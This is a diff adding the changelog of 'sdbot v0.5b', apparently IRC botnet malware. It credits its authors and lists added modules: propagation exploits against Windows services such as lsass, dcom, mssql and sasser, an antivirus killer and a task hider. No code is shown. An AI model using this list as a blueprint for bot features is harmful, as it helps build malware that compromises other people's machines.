@@ -1,0 +1,26 @@
+sdbot v0.5b by [sd]
+credits for the main sdbot0.5b.cpp gose to stoney
+
+//[bcuzZ]//
+
+-added lsass
+-added dcom
+-added mssql
+-added wins
+-added wkssvc
+-added thcsql
+-added sasser
+-added netbios/ntpass credits to rxbot
+
+-added ftp
+-added tftp
+-added avkiller
+-added taskhider
+
+credits to nese
+
+-for mssqllsass.cpp
+-for lsass1lsass.cpp
+-for clsass.cpp
+
+an if i forgot some thing dont hate me ;/
